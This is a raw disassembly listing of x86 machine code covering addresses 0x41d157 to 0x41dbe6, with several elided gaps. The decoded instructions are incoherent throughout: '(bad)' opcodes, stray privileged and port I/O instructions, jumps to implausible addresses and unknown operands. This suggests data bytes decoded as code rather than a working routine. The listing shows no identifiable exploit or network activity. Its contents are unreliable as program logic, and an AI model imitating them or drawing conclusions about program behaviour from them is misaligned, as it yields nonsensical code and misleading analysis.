  41d157:	pop    ds
  41d158:	cmp    al,0xb5
  41d15a:	fbstp  TBYTE PTR [ebp+0x2d521dc9]
  41d160:	dec    ebx
  41d161:	pop    ecx
  41d162:	inc    ebx
  41d163:	pop    edx
  41d164:	fs sub al,0xd1
  41d167:	xchg   ecx,eax
  41d168:	rol    DWORD PTR [edx+0x6a293825],cl
  41d16e:	les    edx,FWORD PTR [ebp+0x2ec6cdc3]
  41d174:	sub    ecx,DWORD PTR [edx-0x73e419a6]
  41d17a:	mov    eax,0xd6f71594
  41d17f:	call   0xcf45711d
  41d184:	jmp    0xe3584a3b
  41d189:	mov    edi,0xdfb85342
  41d18e:	push   es
  41d18f:	jle    0x41d14d
  41d191:	loope  0x41d20b
  41d193:	inc    ebp
  41d194:	inc    ebx
  41d195:	loope  0x41d1c3
  41d197:	mov    BYTE PTR [ebp*8+0x2569d047],al
  41d19e:	jbe    0x41d141
  41d1a0:	mov    bh,0x28
  41d1a2:	push   edi
  41d1a3:	cli    
  41d1a4:	jmp    0x41d217
  41d1a6:	push   eax
  41d1a7:	dec    esp
  41d1a8:	mov    eax,ds:0xb80d9fbb
  41d1ad:	inc    ebx
  41d1af:	push   edi
  41d1b0:	fld    QWORD PTR [eax+eax*1-0x30]
  41d1b4:	popa   
  41d1b5:	and    cl,BYTE PTR [eax+0x4d]
  41d1b8:	retf   0x7158
  41d1bb:	arpl   bp,sp
  41d1bd:	in     al,dx
  41d1be:	jp     0x41d17c
  41d1c0:	cwde   
	...
  41d231:	add    BYTE PTR [eax],al
  41d233:	add    bl,dh
  41d235:	and    ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	sbb    al,0x16
  41d242:	add    BYTE PTR [edi],ch
  41d244:	les    edi,FWORD PTR [ecx]
  41d246:	add    DWORD PTR [eax],eax
  41d248:	cmc    
  41d249:	add    BYTE PTR [eax],al
  41d24b:	add    BYTE PTR [edi],bl
  41d24d:	retf   
  41d24e:	test   BYTE PTR [edx-0x38],0xaf
  41d252:	adc    ebx,DWORD PTR [si-0x71db]
  41d257:	outs   dx,BYTE PTR ds:[esi]
  41d258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d259:	cmp    dl,cl
  41d25b:	jmp    0x41d2ba
  41d25d:	rcl    ah,1
  41d25f:	pop    edi
  41d260:	or     eax,0x6f02f13e
  41d265:	inc    edi
  41d266:	or     BYTE PTR [ecx],0x30
  41d269:	push   esi
  41d26a:	into   
  41d26b:	imul   eax,DWORD PTR [edi-0x2219c0c1],0xbc460ae0
  41d275:	pop    ecx
  41d276:	pop    edx
  41d277:	mov    al,ds:0x14582eb
  41d27c:	cli    
  41d27d:	in     al,0x56
  41d27f:	pop    eax
  41d280:	inc    esi
  41d281:	pop    esi
  41d282:	add    ebp,DWORD PTR [edx+0x49]
  41d285:	and    BYTE PTR es:[ecx+ecx*2],ch
  41d289:	push   ebx
  41d28a:	loop   0x41d26b
  41d28c:	and    eax,0x600d5c42
  41d291:	dec    ebx
  41d292:	aaa    
  41d293:	xchg   BYTE PTR [ecx+0x8300a0],dh
  41d299:	adc    al,0xe9
  41d29b:	clc    
  41d29c:	xchg   ebx,eax
  41d29d:	psubq  mm2,QWORD PTR [esi-0x39]
  41d2a1:	fmul   DWORD PTR [edx]
  41d2a3:	pusha  
  41d2a4:	mov    ds:0x86ca268b,al
  41d2a9:	jecxz  0x41d297
  41d2ab:	pop    ecx
  41d2ac:	retf   0x990e
  41d2af:	sbb    BYTE PTR [eax+0x76331c01],dl
  41d2b5:	dec    edx
  41d2b6:	jno    0x41d2e1
  41d2b8:	int    0x1a
  41d2ba:	jns    0x41d32e
  41d2bc:	out    dx,al
  41d2bd:	cmp    edx,DWORD PTR [ebx]
  41d2bf:	icebp  
  41d2c0:	sti    
  41d2c1:	push   edx
  41d2c2:	fwait
  41d2c3:	dec    esi
  41d2c4:	cmp    al,0x8b
  41d2c6:	mov    cl,0xea
  41d2c8:	addr16 xchg dl,al
  41d2cb:	popa   
  41d2cc:	add    ebp,DWORD PTR [esi]
  41d2ce:	adc    BYTE PTR [eax-0x1b],dh
  41d2d1:	mov    edi,DWORD PTR [ebp-0x34c3d8ee]
  41d2d7:	add    al,0x3b
  41d2d9:	push   edi
  41d2da:	out    0x2,eax
  41d2dc:	pop    esi
  41d2dd:	neg    BYTE PTR [edi]
  41d2df:	cld    
  41d2e0:	mov    ah,0xd6
  41d2e2:	fsub   QWORD PTR [ebp+0x24]
  41d2e5:	xor    dl,BYTE PTR [esi-0x26]
  41d2e8:	and    bl,BYTE PTR [edi+0x59]
  41d2eb:	fcomp  QWORD PTR [ebx-0x79]
  41d2ee:	mov    al,0x2c
  41d2f0:	adc    eax,0xc89922ca
  41d2f5:	fldcw  WORD PTR [ebx-0x3f]
  41d2f8:	(bad)  
  41d2f9:	fadd   st(6),st
  41d2fb:	mov    ebp,0x22ea151d
  41d300:	loop   0x41d2b5
  41d302:	(bad)  
  41d303:	mov    DWORD PTR [edx],esi
  41d305:	cmp    BYTE PTR [edx],0x94
  41d308:	mov    al,0x9d
  41d30a:	adc    eax,0xf5b04094
  41d30f:	dec    edi
  41d310:	dec    ecx
  41d311:	fcmovnb st,st(6)
  41d313:	pop    ecx
  41d314:	jmp    0xa72c88b
  41d319:	push   0x6
  41d31b:	pop    eax
  41d31c:	sahf   
  41d31d:	sub    BYTE PTR [ebx],ah
  41d31f:	or     BYTE PTR [edx],cl
  41d321:	retf   
  41d322:	sub    BYTE PTR [edx-0xba66842],bl
  41d328:	loop   0x41d392
  41d32a:	jl     0x41d371
  41d32c:	fwait
  41d32d:	adc    esi,ebx
  41d32f:	and    eax,0x3dacfa63
  41d334:	sub    BYTE PTR [eax-0x69],0x93
  41d338:	cli    
  41d339:	out    dx,eax
  41d33a:	les    eax,FWORD PTR [ecx]
  41d33c:	sub    DWORD PTR [esi+0x39],edi
  41d33f:	iret   
  41d340:	jae    0x41d342
	...
  41d3b2:	add    BYTE PTR [eax],al
  41d3b4:	push   ebx
  41d3b5:	and    BYTE PTR [eax+0x5faef3ae],ah
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	mov    BYTE PTR [ebx+0x3e],0x4b
  41d3c3:	pop    es
  41d3c4:	mov    ecx,0xf500013a
  41d3c9:	add    BYTE PTR [eax],al
  41d3cb:	add    BYTE PTR [ecx-0x1e],ch
  41d3ce:	aam    0xb8
  41d3d0:	and    BYTE PTR [ebp+0x3307d305],cl
  41d3d6:	cmp    eax,0x5b7f8401
  41d3db:	sbb    DWORD PTR ds:0xd679c4aa,eax
  41d3e1:	mov    esp,0x5e62d3df
  41d3e6:	adc    BYTE PTR [ebp+eiz*2+0x64f43b8a],cl
  41d3ed:	and    BYTE PTR [edx+edi*8-0x22],bh
  41d3f1:	lahf   
  41d3f2:	jg     0x41d418
  41d3f4:	jae    0x41d459
  41d3f6:	test   eax,0xcdb3b1f8
  41d3fb:	mov    ds:0x378697b6,eax
  41d400:	jns    0x41d3d4
  41d402:	push   ebx
  41d403:	pop    ds
  41d404:	mov    eax,DWORD PTR [eax-0x2d]
  41d407:	pop    edi
  41d408:	je     0x41d41f
  41d40a:	inc    eax
  41d40b:	sbb    ecx,DWORD PTR [esi]
  41d40d:	loop   0x41d42e
  41d40f:	jge    0x41d44e
  41d411:	pop    ds
  41d412:	jae    0x41d44f
  41d414:	jnp    0x41d48e
  41d416:	pop    edx
  41d417:	push   ecx
  41d418:	add    dh,BYTE PTR [esi]
  41d41a:	mov    esi,0xff87ede5
  41d41f:	pop    ecx
  41d420:	loopne 0x41d48e
  41d422:	mov    esi,0x8a567ef
  41d427:	jecxz  0x41d453
  41d429:	cmp    al,0x69
  41d42b:	sub    ebx,ebp
  41d42d:	jmp    0x5ba9:0xe2131dc
  41d434:	cmp    DWORD PTR [ebx+0x48],ebx
  41d437:	rcr    dl,1
  41d439:	jle    0x41d41a
  41d43b:	jo     0x41d43d
  41d43d:	and    BYTE PTR [edx-0x4e4e6c4f],ch
  41d443:	xor    DWORD PTR [edi-0xa],edi
  41d446:	data16 mov ah,0x17
  41d449:	and    dl,ch
  41d44b:	push   edx
  41d44c:	ret    
  41d44d:	dec    ecx
  41d44e:	dec    BYTE PTR [edi+0x2e]
  41d451:	add    DWORD PTR [edi+0x5090c0cf],ebp
  41d457:	pop    ebx
  41d458:	push   ecx
  41d459:	jae    0x41d466
  41d45b:	pop    esi
  41d45c:	add    esp,ecx
  41d45e:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41d460:	push   ss
  41d461:	jbe    0x41d42f
  41d463:	inc    esp
  41d464:	jns    0x41d446
  41d466:	pushf  
  41d467:	loop   0x41d495
  41d469:	ins    BYTE PTR es:[edi],dx
  41d46a:	dec    eax
  41d46b:	lds    eax,FWORD PTR [edx-0x7]
  41d46e:	adc    BYTE PTR [ecx],dh
  41d470:	ins    BYTE PTR es:[edi],dx
  41d471:	push   edi
  41d472:	xchg   DWORD PTR [edx],ecx
  41d474:	mov    edi,0xe40777eb
  41d479:	xor    eax,0x10e07853
  41d47e:	adc    al,0x4f
  41d480:	and    DWORD PTR [esi-0x14613942],esi
  41d486:	fwait
  41d487:	xchg   ecx,eax
  41d488:	sub    ah,bh
  41d48a:	mov    ds:0x197f0232,al
  41d48f:	jnp    0x41d465
  41d491:	inc    ecx
  41d492:	lahf   
  41d493:	adc    al,0xc6
  41d495:	jns    0x41d509
  41d497:	outs   dx,BYTE PTR ds:[esi]
  41d498:	call   0xc75a:0x616ddeec
  41d49f:	lds    edx,FWORD PTR [ebx-0x1f89a92f]
  41d4a5:	xor    bh,BYTE PTR [ecx-0x28]
  41d4a8:	outs   dx,DWORD PTR ds:[esi]
  41d4a9:	or     BYTE PTR [ebp+eax*4+0x5470d4a3],ch
  41d4b0:	ja     0x41d449
  41d4b2:	xchg   eax,ebp
  41d4b4:	push   ecx
  41d4b5:	jnp    0x41d521
  41d4b7:	cmp    DWORD PTR [edx+0x2a],edi
  41d4ba:	add    esp,ecx
  41d4bc:	imul   eax,DWORD PTR [ebx+0x2],0xffffffd7
  41d4c0:	add    eax,DWORD PTR [eax]
	...
  41d532:	add    BYTE PTR [eax],al
  41d534:	lds    esp,FWORD PTR [ebx]
  41d536:	xchg   ecx,eax
  41d537:	and    eax,0xe3f5b7f7
  41d53c:	push   ecx
  41d53d:	or     edi,DWORD PTR [edx+ecx*8+0x1903b42d]
  41d544:	scas   al,BYTE PTR es:[edi]
  41d545:	cmp    eax,DWORD PTR [ecx]
  41d547:	add    ch,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    bh,bh
  41d54d:	stos   DWORD PTR es:[edi],eax
  41d54e:	in     al,dx
  41d54f:	xor    al,0xdd
  41d551:	popf   
  41d552:	push   esi
  41d553:	mov    ebp,0xc87cf9e4
  41d558:	cdq    
  41d559:	mov    dh,0xb7
  41d55b:	jmp    0x6562d4a1
  41d560:	and    ch,BYTE PTR [ebp-0x65f4b9cf]
  41d566:	hlt    
  41d567:	adc    DWORD PTR ds:0xcd51301,eax
  41d56d:	mov    ch,ah
  41d56f:	cdq    
  41d570:	mov    ah,0x60
  41d572:	jne    0x41d55e
  41d574:	and    bl,0xda
  41d577:	cdq    
  41d578:	sub    bh,BYTE PTR [esi-0x9a776d9]
  41d57e:	add    DWORD PTR ds:0xdd084db0,edi
  41d584:	(bad)  
  41d585:	mov    ebx,0x597b952d
  41d58a:	test   DWORD PTR [edi-0x2a],esi
  41d58d:	xchg   esi,eax
  41d58e:	add    eax,0xc5e80738
  41d593:	pop    ss
  41d594:	mov    eax,ds:0x7ff54f59
  41d599:	sbb    ah,BYTE PTR [ebp+0x55]
  41d59c:	shl    BYTE PTR [ebp+0x5d],cl
  41d59f:	mov    ecx,0xfcf43ce8
  41d5a4:	fisttp QWORD PTR [ebx]
  41d5a6:	push   eax
  41d5a7:	mov    eax,0x5facdf20
  41d5ac:	and    BYTE PTR ds:[ecx],al
  41d5af:	adc    BYTE PTR [esi-0x1f67609d],bl
  41d5b5:	enter  0x5103,0xe2
  41d5b9:	jb     0x41d5ab
  41d5bb:	mov    al,0x96
  41d5bd:	inc    ebp
  41d5be:	sti    
  41d5bf:	bound  edi,QWORD PTR [esi+0x60032f1d]
  41d5c5:	adc    DWORD PTR [edi+0x9],0x446473f6
  41d5cc:	and    ebx,ecx
  41d5ce:	xchg   edi,eax
  41d5cf:	xor    DWORD PTR [ebp+0x4f23d6db],ebx
  41d5d5:	fimul  DWORD PTR [ebp-0x4b160276]
  41d5db:	mov    WORD PTR [esi+0x54326708],fs
  41d5e1:	inc    ecx
  41d5e2:	mov    ebp,DWORD PTR [ebp-0x50]
  41d5e5:	and    BYTE PTR [esi-0x5e2832ae],cl
  41d5eb:	rcr    BYTE PTR es:[edi],1
  41d5ee:	fstp   DWORD PTR [ecx+0x41]
  41d5f1:	inc    ecx
  41d5f2:	mov    edx,0x5d5e34eb
  41d5f7:	xchg   ebx,eax
  41d5f8:	push   ebp
  41d5f9:	adc    DWORD PTR [ecx],ebx
  41d5fb:	push   ebx
  41d5fc:	pop    esp
  41d5fd:	cld    
  41d5fe:	imul   ebx,DWORD PTR [esi-0x24],0xeb7fa923
  41d605:	dec    ebp
  41d607:	in     eax,dx
  41d608:	in     eax,0xa9
  41d60a:	mov    bl,0x1a
  41d60c:	ja     0x41d5fe
  41d60e:	and    DWORD PTR [ecx+0x5e393d0e],edi
  41d614:	test   al,0x6d
  41d616:	cvtpi2ps xmm3,QWORD PTR [esi+0x6e5a244c]
  41d61d:	xchg   ecx,eax
  41d61e:	ror    BYTE PTR [ebx+0x36aa38c8],0x88
  41d625:	jae    0x41d5da
  41d627:	pop    edi
  41d628:	das    
  41d629:	fdiv   DWORD PTR ss:[ebp+0x2b318960]
  41d630:	imul   ecx,DWORD PTR [ebx-0x3e9ffc94],0x41
  41d637:	jb     0x41d61e
  41d639:	mov    eax,ds:0xc8a391d4
  41d63e:	and    dh,bl
  41d640:	out    dx,eax
	...
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    dl,bl
  41d6b5:	add    edx,eax
  41d6b7:	xchg   bl,bl
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0x868c0a3b
  41d6c2:	popa   
  41d6c3:	mov    ebx,0x13ca3
  41d6c8:	cmc    
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    BYTE PTR [ebx-0x67d69fe6],cl
  41d6d1:	icebp  
  41d6d2:	pop    edi
  41d6d3:	lock mov eax,edx
  41d6d6:	scas   eax,DWORD PTR es:[edi]
  41d6d7:	mov    ebp,DWORD PTR ds:[esi+eax*8-0x3d566d31]
  41d6df:	adc    al,0xea
  41d6e1:	in     eax,0x9f
  41d6e3:	mov    eax,ds:0x7ee51731
  41d6e8:	sbb    bh,BYTE PTR [edi]
  41d6ea:	jb     0x41d6e7
  41d6ec:	xor    ebx,DWORD PTR [eax-0x32ef338f]
  41d6f2:	adc    DWORD PTR [ecx+eax*1+0x2764f8f1],0x51c919c6
  41d6fd:	push   es
  41d6fe:	push   esi
  41d6ff:	retf   
  41d700:	das    
  41d701:	add    DWORD PTR [edx+0xd],eax
  41d704:	pop    ds
  41d705:	inc    esp
  41d706:	aas    
  41d707:	mov    bl,BYTE PTR [ebp+edx*4-0x52]
  41d70b:	popa   
  41d70c:	adc    dh,BYTE PTR [ecx]
  41d70e:	repnz cmp al,0x94
  41d711:	xor    dh,BYTE PTR [edx]
  41d713:	lods   al,BYTE PTR ds:[esi]
  41d714:	mov    ds:0xdf4036a6,eax
  41d719:	jl     0x41d6b0
  41d71b:	xor    esi,DWORD PTR [ebx-0x6ae2ce5a]
  41d721:	mov    esi,ebx
  41d723:	lods   al,BYTE PTR ds:[esi]
  41d724:	ins    DWORD PTR es:[edi],dx
  41d725:	jg     0x41d716
  41d727:	je     0x41d73d
  41d729:	aad    0x46
  41d72b:	and    al,0x29
  41d72e:	imul   esp,DWORD PTR [edi],0x67
  41d731:	imul   ebp,DWORD PTR [edx],0x197045aa
  41d737:	xor    BYTE PTR [esi+edx*1],0xfe
  41d73b:	jbe    0x41d765
  41d73d:	mov    esp,?
  41d73f:	or     DWORD PTR [edi+0x4b23c5c5],ecx
  41d745:	lea    edi,ds:0x8b73eee
  41d74b:	imul   esp,DWORD PTR [ecx],0x44b971b2
  41d751:	fincstp 
  41d753:	gs fdivr st,st(1)
  41d756:	loopne 0x41d754
  41d758:	mov    ah,0x99
  41d75a:	sub    ah,BYTE PTR [edi]
  41d75c:	repnz dec eax
  41d75e:	xor    cl,bl
  41d760:	repz push 0x26
  41d763:	cmp    eax,0xd291d992
  41d768:	dec    esi
  41d769:	sar    DWORD PTR [edx-0x2112d4d],1
  41d76f:	hlt    
  41d770:	aas    
  41d771:	enter  0x399f,0x8b
  41d775:	std    
  41d776:	into   
  41d777:	sbb    al,BYTE PTR [edi]
  41d779:	test   BYTE PTR [edx],al
  41d77b:	shl    DWORD PTR [eax+0x581916cc],0x48
  41d782:	jno    0x41d7a6
  41d784:	jne    0x41d76e
  41d786:	in     eax,0xc8
  41d788:	jb     0x41d7fe
  41d78a:	pusha  
  41d78b:	(bad)  
  41d78d:	pusha  
  41d78e:	repz ss jae 0x41d75a
  41d792:	mov    esi,0x5d49afaf
  41d797:	add    DWORD PTR [edi+0x2e841398],edx
  41d79d:	adc    ch,BYTE PTR [eax-0xa]
  41d7a0:	cs ds jle 0x41d7ca
  41d7a4:	xchg   DWORD PTR [ebx+0x73],edi
  41d7a7:	pop    ds
  41d7a8:	shl    BYTE PTR [edi+0x20e412c7],cl
  41d7ae:	and    al,dl
  41d7b0:	push   cs
  41d7b1:	das    
  41d7b2:	jae    0x41d7e9
  41d7b4:	cmp    DWORD PTR [bx],0x9074b2b9
  41d7bb:	xchg   ebx,eax
  41d7bc:	and    DWORD PTR [ebx+edi*4+0x20e1],0x0
	...
  41d833:	add    BYTE PTR [ebx+0x34],ah
  41d836:	lods   eax,DWORD PTR ds:[esi]
  41d837:	xor    al,0xff
  41d839:	mov    ebp,0xf28777fb
  41d83e:	pop    es
  41d83f:	add    ebx,ebx
  41d841:	jmp    0x1:0x3d9864f4
  41d848:	cmc    
  41d849:	add    BYTE PTR [eax],al
  41d84b:	add    BYTE PTR [edx+0x578bc986],cl
  41d851:	inc    esi
  41d852:	dec    edx
  41d853:	pop    es
  41d854:	dec    BYTE PTR [ebp+0x3daf0407]
  41d85a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d85b:	or     al,0xe4
  41d85d:	imul   edi,esp,0x60cf5ad1
  41d863:	test   BYTE PTR [edx-0x3db56aac],dl
  41d869:	mov    ecx,0xd51bc65f
  41d86e:	rcl    BYTE PTR [ebp-0x41],0xe9
  41d872:	and    eax,0x91efa869
  41d877:	dec    edi
  41d878:	jg     0x41d83e
  41d87a:	jb     0x41d87a
  41d87c:	push   ss
  41d87d:	ins    BYTE PTR es:[edi],dx
  41d87e:	(bad)  
  41d87f:	jge    0x41d8fb
  41d881:	mov    esp,0x24717ebb
  41d886:	dec    ecx
  41d887:	sbb    BYTE PTR [eax+0x68],al
  41d88a:	(bad)  
  41d88c:	test   eax,0x7e4a96b8
  41d891:	pop    edi
  41d892:	lds    edx,FWORD PTR [ebx+0x4c4c805d]
  41d898:	icebp  
  41d899:	hlt    
  41d89a:	sub    BYTE PTR [eax+0x5c5ac3b6],dh
  41d8a0:	and    DWORD PTR [ebx-0x66],0x3a
  41d8a4:	clc    
  41d8a5:	or     al,0xd
  41d8a7:	(bad)  
  41d8a8:	stos   DWORD PTR es:[edi],eax
  41d8a9:	ja     0x41d830
  41d8ab:	test   DWORD PTR [ebp+0xf412d6e],ebp
  41d8b1:	mov    eax,ds:0x42c04329
  41d8b6:	test   edx,edi
  41d8b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8b9:	cwde   
  41d8ba:	jg     0x41d875
  41d8bc:	(bad)  
  41d8bd:	sub    esi,eax
  41d8bf:	add    eax,0x16eeb67
  41d8c4:	mov    al,0xba
  41d8c6:	jnp    0x41d854
  41d8c8:	inc    esi
  41d8c9:	cmp    bh,BYTE PTR [eax-0x7f]
  41d8cc:	mov    eax,0x74583d4
  41d8d1:	rcr    BYTE PTR [edx+0x4b20bca9],0x17
  41d8d8:	cmp    ecx,esi
  41d8da:	jae    0x41d941
  41d8dc:	popf   
  41d8dd:	in     eax,0xe7
  41d8df:	ret    
  41d8e0:	ja     0x41d92b
  41d8e2:	cli    
  41d8e3:	bnd jnp 0x41d896
  41d8e6:	fldenv [esi]
  41d8e8:	dec    ebx
  41d8e9:	adc    BYTE PTR [edx-0xccae56f],dl
  41d8ef:	outs   dx,BYTE PTR ds:[esi]
  41d8f0:	addr16 pop ebp
  41d8f2:	push   0xc5fa8511
  41d8f7:	sar    DWORD PTR [ebp-0x3ca261e],1
  41d8fd:	pop    edi
  41d8fe:	aad    0xe4
  41d900:	(bad)  
  41d901:	enter  0x82e6,0xbc
  41d905:	sub    al,0x91
  41d907:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d909:	inc    ebp
  41d90a:	push   edi
  41d90b:	scas   al,BYTE PTR es:[edi]
  41d90c:	pop    edi
  41d90d:	and    al,0x31
  41d90f:	jecxz  0x41d963
  41d911:	retf   0x1c5b
  41d914:	popa   
  41d915:	stos   BYTE PTR es:[edi],al
  41d916:	retf   
  41d917:	jle    0x41d968
  41d919:	push   edi
  41d91a:	ss mov ecx,0xfaef3d5f
  41d920:	(bad)  
  41d921:	mov    dh,0x2e
  41d923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d924:	(bad)  
  41d925:	retf   0x92c1
  41d928:	das    
  41d929:	inc    esi
  41d92a:	cwde   
  41d92b:	test   ch,ch
  41d92d:	pop    edx
  41d92e:	clc    
  41d92f:	pop    ss
  41d930:	pop    ebp
  41d931:	loop   0x41d924
  41d933:	mov    al,ds:0xb9785cbb
  41d938:	mov    dl,0x12
  41d93a:	gs mov ecx,0x3c8f169e
  41d940:	cmp    eax,0x0
	...
  41d9b1:	add    BYTE PTR [eax],al
  41d9b3:	add    al,dh
  41d9b5:	retf   0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x9095af1c
  41d9c3:	pop    ebp
  41d9c4:	lea    edi,[esi]
  41d9c6:	add    DWORD PTR [eax],eax
  41d9c8:	cmc    
  41d9c9:	add    BYTE PTR [eax],al
  41d9cb:	add    al,dh
  41d9cd:	cmp    dh,dh
  41d9cf:	mov    eax,ds:0xed22caf0
  41d9d4:	loope  0x41d9a8
  41d9d6:	add    al,0xa1
  41d9d8:	fidiv  DWORD PTR [edi+0x2c34fe7f]
  41d9de:	pop    bx
  41d9e0:	gs enter 0x6b94,0x16
  41d9e5:	mov    ah,0xa5
  41d9e7:	js     0x41da24
  41d9e9:	dec    ebp
  41d9ea:	ja     0x41d9aa
  41d9ec:	mov    WORD PTR [eax],?
  41d9ee:	cmp    eax,DWORD PTR [ebx]
  41d9f0:	shl    BYTE PTR [ebp-0x14],cl
  41d9f3:	prefetch BYTE PTR [edi-0x2f]
  41d9f7:	inc    esp
  41d9f8:	ja     0x41da08
  41d9fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9fb:	jle    0x41d9c9
  41d9fd:	pop    ds
  41d9fe:	jmp    0x9c75710b
  41da03:	dec    edi
  41da04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da05:	outs   dx,DWORD PTR ds:[esi]
  41da06:	dec    eax
  41da07:	mov    dh,0x83
  41da09:	push   cs
  41da0a:	push   es
  41da0b:	pop    ds
  41da0c:	push   edi
  41da0d:	mov    WORD PTR [eax],cs
  41da0f:	add    BYTE PTR [ecx+edx*4-0x16e9e29f],dh
  41da16:	ret    0x9d27
  41da19:	mov    eax,0x45f190bb
  41da1e:	sbb    eax,0xbdbc40a8
  41da23:	push   0x60c44174
  41da28:	pusha  
  41da29:	dec    edx
  41da2a:	adc    BYTE PTR [edi],ah
  41da2c:	add    ecx,DWORD PTR [edx]
  41da2e:	outs   dx,BYTE PTR ds:[esi]
  41da2f:	loopne 0x41d9d8
  41da31:	icebp  
  41da32:	(bad)  
  41da33:	fdivr  DWORD PTR [ecx+ebx*1-0x1f]
  41da37:	dec    edi
  41da38:	(bad)  
  41da39:	sub    BYTE PTR [esi-0x2e],al
  41da3c:	adc    al,BYTE PTR [ebp+0x74a9774b]
  41da42:	dec    edi
  41da43:	cli    
  41da44:	ror    BYTE PTR [ecx],1
  41da46:	xor    edi,esp
  41da48:	imul   ebx,ebx,0x82feddc1
  41da4e:	fcmovnb st,st(7)
  41da50:	int3   
  41da51:	out    0xcc,eax
  41da53:	lods   eax,DWORD PTR ds:[esi]
  41da54:	xor    DWORD PTR [esi-0x5d2f4432],edi
  41da5a:	in     eax,0xde
  41da5c:	xlat   BYTE PTR ds:[ebx]
  41da5d:	and    ch,BYTE PTR [ebp-0x6375b4fa]
  41da63:	jg     0x41da22
  41da65:	scas   al,BYTE PTR es:[edi]
  41da66:	and    al,0xb7
  41da68:	dec    esi
  41da69:	sub    dh,BYTE PTR [ebx+ecx*2]
  41da6c:	jo     0x41d9ff
  41da6e:	or     dh,BYTE PTR ds:0x210e747a
  41da74:	jp     0x41da94
  41da76:	and    edx,DWORD PTR [ebx-0x5b2b4c0a]
  41da7c:	adc    ebx,0xcf036be9
  41da82:	jg     0x41da45
  41da84:	xor    eax,0x1f350536
  41da89:	adc    BYTE PTR [ebx-0x2e2cc71a],dh
  41da8f:	mov    WORD PTR [esi+0x31],?
  41da92:	pop    ecx
  41da93:	adc    eax,DWORD PTR [ecx-0x4718bbc8]
  41da99:	(bad)  
  41da9a:	std    
  41da9b:	sbb    esi,DWORD PTR [ebp-0x1d]
  41da9e:	pushf  
  41da9f:	out    0x97,al
  41daa1:	push   cs
  41daa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daa3:	xor    eax,0x2633f9ed
  41daa8:	jmp    0x65e52879
  41daad:	retf   
  41daae:	push   ecx
  41daaf:	leave  
  41dab0:	pmulhw mm0,QWORD PTR [ecx+0x4a]
  41dab4:	loopne 0x41dabf
  41dab6:	mov    bl,0x89
  41dab8:	inc    esi
  41dab9:	or     DWORD PTR [esi],esp
  41dabb:	popa   
  41dabc:	or     al,BYTE PTR [ecx]
  41dabe:	pop    DWORD PTR [edi+0x16]
	...
  41db31:	add    BYTE PTR [eax],al
  41db33:	add    BYTE PTR [ecx],ch
  41db35:	(bad)  
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	jo     0x41dafe
  41db42:	lods   al,BYTE PTR ds:[esi]
  41db43:	dec    esp
  41db44:	cmp    BYTE PTR [edi],0x1
  41db47:	add    ch,dh
  41db49:	add    BYTE PTR [eax],al
  41db4b:	add    BYTE PTR [esi],dl
  41db4d:	cwde   
  41db4e:	lods   eax,DWORD PTR ds:[esi]
  41db4f:	pop    ds
  41db50:	fdiv   QWORD PTR [eax+0x31]
  41db53:	adc    dh,BYTE PTR [edx+0x4]
  41db56:	mov    dl,0x81
  41db58:	adc    edx,DWORD PTR [eax+0x5]
  41db5b:	hlt    
  41db5c:	xor    BYTE PTR [edi-0x59],ch
  41db5f:	bound  ebx,QWORD PTR [ebx]
  41db61:	into   
  41db62:	mov    ebp,0xb4e522bc
  41db67:	loopne 0x41db45
  41db69:	ins    BYTE PTR es:[edi],dx
  41db6a:	cmp    dh,BYTE PTR [ebx+eax*8-0x3a8e1294]
  41db71:	fimul  DWORD PTR [eax+ebp*2+0x6e]
  41db75:	sbb    DWORD PTR fs:[ecx],0x77
  41db79:	into   
  41db7a:	mov    ebp,0x62caf4a3
  41db7f:	lods   eax,DWORD PTR ds:[esi]
  41db80:	adc    esp,DWORD PTR [edi+0x6e8ca4aa]
  41db86:	and    eax,0x2378cb43
  41db8b:	pop    es
  41db8c:	in     al,0xfb
  41db8e:	sbb    DWORD PTR [ecx+0x2d552a72],edx
  41db94:	and    al,0x1a
  41db96:	cdq    
  41db97:	jno    0x41dbec
  41db99:	popa   
  41db9a:	adc    cl,BYTE PTR [edi+eax*4-0x6daf9a91]
  41dba1:	mov    ds:0x1e0021a5,eax
  41dba6:	repz mov bl,bh
  41dba9:	icebp  
  41dbaa:	jl     0x41dbe0
  41dbac:	in     al,dx
  41dbad:	sub    DWORD PTR [esi-0xd23f840],0x30
  41dbb4:	jmp    0x41db9c
  41dbb6:	cmp    bl,BYTE PTR [esi-0x4350356e]
  41dbbc:	pop    ds
  41dbbd:	loopne 0x41dc16
  41dbbf:	call   DWORD PTR [esi]
  41dbc1:	inc    ebx
  41dbc2:	adc    BYTE PTR [edx-0x3f],bh
  41dbc5:	cmp    DWORD PTR [edi-0x58],edx
  41dbc8:	bnd jno 0x41db7b
  41dbcb:	pop    ss
  41dbcc:	out    dx,eax
  41dbcd:	adc    BYTE PTR [edx+0x7f641ede],dl
  41dbd3:	mov    edx,0xa6b19b81
  41dbd8:	ror    BYTE PTR [esi],cl
  41dbda:	sub    al,0x22
  41dbdc:	jnp    0x41dbaa
  41dbde:	test   dh,0xb4
  41dbe1:	mov    dh,0xf2
  41dbe3:	inc    ecx
  41dbe4:	cmp    bl,bh
  41dbe6:	ficomp WORD PTR [esp+edx*8-0x209af086]
